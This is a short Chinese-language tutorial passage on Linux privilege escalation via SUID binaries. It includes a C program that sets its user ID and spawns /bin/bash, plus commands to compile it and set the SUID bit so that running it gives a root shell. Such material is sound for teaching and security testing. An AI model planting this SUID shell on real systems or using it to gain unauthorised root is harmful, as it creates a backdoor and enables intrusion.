系统或程序调用任何**具有 SUID 权限**的脚本都有可能被利用来提权，可以是PHP、Python或C语言脚本。

例如下面是C 语言脚本，它将在执行时提供bash shell：
```
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h> 

int main()
{
  setuid(geteuid());
  system( " /bin/bash" );
  return 0;
}
```

假设管理员将以上脚本保存为 asroot.c，使用 gcc 编译为 shell 可执行文件，并为 shell 添加了SUID权限：

```
mkdir /bin/rootshell
cd /bin/rootshell
cp /home/raj/Desktop/asroot.c .
ls
gcc asroot.c -o shell
chmod u+s shell
ls -al shell
```
那我我们执行 shell 文件就可以获得一个具有 root 权限的 shell。
